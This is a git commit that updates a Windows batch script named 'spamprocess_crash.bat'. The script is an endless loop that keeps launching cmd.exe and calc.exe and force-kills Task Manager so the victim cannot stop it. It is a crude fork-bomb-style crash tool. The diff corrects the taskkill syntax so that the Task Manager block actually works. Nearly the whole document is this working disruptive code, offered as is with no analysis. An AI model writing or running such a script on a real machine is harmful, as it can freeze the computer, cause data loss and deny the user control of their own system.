e51560274866db922ca77c3a871902d9654f0e55
Webious_ <37440099+Webious@users.noreply.github.com>
2020-02-15 23:17:59 +0100

    Update spamprocess_crash.bat

--- spamprocess_crash.bat
+++ spamprocess_crash.bat
@@ -1,73 +1,39 @@
 @echo off
 :loop
 start cmd.exe
-taskkill /im /f taskmgr.exe
+taskkill /im taskmgr.exe /f /t
 start calc.exe
-taskkill /im /f taskmgr.exe
-start notepad.exe
-taskkill /im /f taskmgr.exe
-start chrome.exe
-taskkill /im /f taskmgr.exe
-start iexplore.exe
-taskkill /im /f taskmgr.exe
 start cmd.exe
-taskkill /im /f taskmgr.exe
+taskkill /im taskmgr.exe /f /t
 start calc.exe
-taskkill /im /f taskmgr.exe
-start notepad.exe
-taskkill /im /f taskmgr.exe
-start chrome.exe
-taskkill /im /f taskmgr.exe
-start iexplore.exe
-taskkill /im /f taskmgr.exe
 start cmd.exe
-taskkill /im /f taskmgr.exe
+taskkill /im taskmgr.exe /f /t
 start calc.exe
-taskkill /im /f taskmgr.exe
-start notepad.exe
-taskkill /im /f taskmgr.exe
-start chrome.exe
-taskkill /im /f taskmgr.exe
-start iexplore.exe
-taskkill /im /f taskmgr.exe
 start cmd.exe
-taskkill /im /f taskmgr.exe
+taskkill /im taskmgr.exe /f /t
 start calc.exe
-taskkill /im /f taskmgr.exe
-start notepad.exe
-taskkill /im /f taskmgr.exe
-start chrome.exe
-taskkill /im /f taskmgr.exe
-start iexplore.exe
-taskkill /im /f taskmgr.exe
 start cmd.exe
-taskkill /im /f taskmgr.exe
+taskkill /im taskmgr.exe /f /t
 start calc.exe
-taskkill /im /f taskmgr.exe
-start notepad.exe
-taskkill /im /f taskmgr.exe
-start chrome.exe
-taskkill /im /f taskmgr.exe
-start iexplore.exe
-taskkill /im /f taskmgr.exe
 start cmd.exe
-taskkill /im /f taskmgr.exe
+taskkill /im taskmgr.exe /f /t
 start calc.exe
-taskkill /im /f taskmgr.exe
-start notepad.exe
-taskkill /im /f taskmgr.exe
-start chrome.exe
-taskkill /im /f taskmgr.exe
-start iexplore.exe
-taskkill /im /f taskmgr.exe
 start cmd.exe
-taskkill /im /f taskmgr.exe
+taskkill /im taskmgr.exe /f /t
 start calc.exe
-taskkill /im /f taskmgr.exe
-start notepad.exe
-taskkill /im /f taskmgr.exe
-start chrome.exe
-taskkill /im /f taskmgr.exe
-start iexplore.exe
-taskkill /im /f taskmgr.exe
+start cmd.exe
+taskkill /im taskmgr.exe /f /t
+start calc.exe
+start cmd.exe
+taskkill /im taskmgr.exe /f /t
+start calc.exe
+start cmd.exe
+taskkill /im taskmgr.exe /f /t
+start calc.exe
+start cmd.exe
+taskkill /im taskmgr.exe /f /t
+start calc.exe
+start cmd.exe
+taskkill /im taskmgr.exe /f /t
+start calc.exe
 goto loop
